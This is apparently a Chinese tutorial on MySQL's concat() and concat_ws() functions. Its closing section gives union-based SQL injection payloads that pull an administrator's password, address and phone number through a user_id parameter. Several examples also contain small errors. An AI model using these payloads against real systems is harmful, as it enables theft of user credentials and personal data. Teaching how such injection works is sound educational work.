# concat()函数

- 语法：

  ```sql
  concat(str1,str2...)
  ```

- 示例：

  concat()函数：

  ```sql
  select concat('1','2','3') from test;
  
  +---------------------+  
  | concat('1','2','3') |  
  +---------------------+  
  | 123 |  
  +---------------------+
  ```

  如果连接串中存在NULL，则返回NULL：

  ```sql
  select concat('1','2',NULL,'3') from test;
  
  +--------------------------+  
  | concat('1','2',NULL,'3') |  
  +--------------------------+  
  | NULL |  
  +--------------------------+
  ```

# concat_ws()函数

- 语法：

  ```sql
  concat(separator,str1,str2...)
  ```

- 示例：

  使用冒号作为分隔符：

  ```sql
  select concat_ws(':','1','2','3') from test;
  
  +----------------------------+  
  | concat_ws(':','1','2','3') |  
  +----------------------------+  
  | 1:2:3 |  
  +----------------------------+
  ```

  分隔符为	NULL，则返回结果为NULL：

  ```sql
  select concat_ws(NULL,'1','2','3') from test;
  
  +-----------------------------+  
  | concat_ws(NULL,'1','2','3') |  
  +-----------------------------+  
  | NULL |   
  +-----------------------------+
  ```

  如果参数中存在NULL，则会被忽略：

  ```sql
  select concat_ws(':','1','2',NULL,NULL,'3') from test;
  
  +-------------------------------------------+  
  | concat_ws(':','1','2',NULL,NULL,NULL,'3') |  
  +-------------------------------------------+  
  | 1:2:3 |  
  +-------------------------------------------+
  ```

  对NULL进行判断，并用其它值进行替换：

  ```sql
  select concat_ws(':','1','2',ifNULL(NULL,'0'),'3') from test
  
  +---------------------------------------------+  
  | concat_ws(':','1','2',ifNULL(NULL,'0'),'3') |  
  +---------------------------------------------+  
  | 1:2:0:3                                     |   
  +---------------------------------------------+
  ```

# concat的SQL注入

```sql
select username,email,content from test_table where user_id=uid;
```

user_id接收输入

使用concat进行sql注入：

```sql
uid=-1 union select username ,concat(password,sex,address,telephone),content from test_talbe where user_id=管理员id;
```

更好的方法：中间用分隔符分开：

```sql
uid=-1 union select username ,concat(password,0×3a,sex,0×3a,address,0×3a,telephone) ,content from test_talbe where user_id=管理员id;
```

其中0×3a是“:”的十六进制形式。 